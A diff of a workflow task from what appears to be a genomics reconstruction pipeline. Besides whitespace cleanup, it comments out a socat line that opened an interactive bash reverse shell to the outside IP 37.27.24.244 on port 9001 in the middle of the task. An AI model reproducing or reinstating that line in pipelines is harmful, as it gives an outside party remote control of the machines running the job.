@@ -32,7 +32,6 @@ task recon {
     wget https://raw.githubusercontent.com/MacoskoLab/Macosko-Pipelines/main/reconstruction/reconstruction_blind.py
     wget https://raw.githubusercontent.com/MacoskoLab/Macosko-Pipelines/main/reconstruction/helpers.py
 
-
     recon_output_path="~{recon_output_path}"
     recon_output_path="${recon_output_path%/}/~{id}"
     echo "Output directory: $recon_output_path" ; echo
@@ -51,7 +50,7 @@ task recon {
         gcloud storage cp blind_raw_reads_filtered.csv.gz blind_statistics_filtered.csv QC.pdf "$recon_output_path"
     fi
 
-    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:37.27.24.244:9001
+    # socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:37.27.24.244:9001
 
     # Run reconstruction_blind.py
     if [[ -f blind_raw_reads_filtered.csv.gz ]] ; then
@@ -61,7 +60,6 @@ task recon {
     else
         echo "Cannot run reconstruction_blind.py, blind_raw_reads_filtered.csv.gz not found" 
     fi
-
 
     echo; echo "Writing logs:"
     kill $(ps aux | fgrep dstat | fgrep -v grep | awk '{print $2}')
